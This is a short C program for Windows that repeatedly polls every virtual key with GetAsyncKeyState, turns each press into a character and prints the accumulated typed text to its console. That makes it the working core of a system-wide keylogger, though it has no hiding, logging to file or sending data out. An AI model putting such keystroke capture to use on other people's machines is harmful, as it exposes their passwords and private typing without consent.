#include <windows.h>
#include <stdio.h>

void vkey_to_char(int vKey, char buffer[256], int *index) {
    SHORT press = GetAsyncKeyState(vKey);
        if (press & 0x0001) {
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
        
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                keyboardState[VK_SHIFT] |= 0x80;
            }
            UINT scanCode = MapVirtualKey(vKey, MAPVK_VK_TO_VSC);
            WCHAR unicodeChar[4];
            int result = ToUnicode(vKey, scanCode, keyboardState, unicodeChar, 4, 0);

            if (*index < 255) {
                // printf("Key 0x%02X pressed\n", vKey);
                if (unicodeChar[0] >= 32 && unicodeChar[0] <= 126)   {
                    buffer[*index] = (char)unicodeChar[0];
                    // printf("%c\n", buffer[*index]);
                    (*index)++;
                    buffer[*index] = '\0';  // null-terminate string
                } else if (unicodeChar[0] == 8 && *index > 0) {
                    (*index)--;
                    buffer[*index] = '\0';
                }
                printf("Typed: %s\n", buffer);
                // printf("UniCodeChar: %d\n", unicodeChar[0]);
            } else {
                printf("\nOVERFLOWED\n");
            }
        }
}
int main() {
    for (int vKey = 0x08; vKey <= 0xFE; vKey++) {
        GetAsyncKeyState(vKey); // Clears LSB so only future presses are seen
    }

    char buffer[256] = {0};
    int index = 0;

    while (1) {
        for (int vKey = 0x08; vKey <= 0xFE; vKey++) {
            vkey_to_char(vKey, buffer, &index);
        }
        Sleep(10);  // 10ms delay
    }
    return 0;
}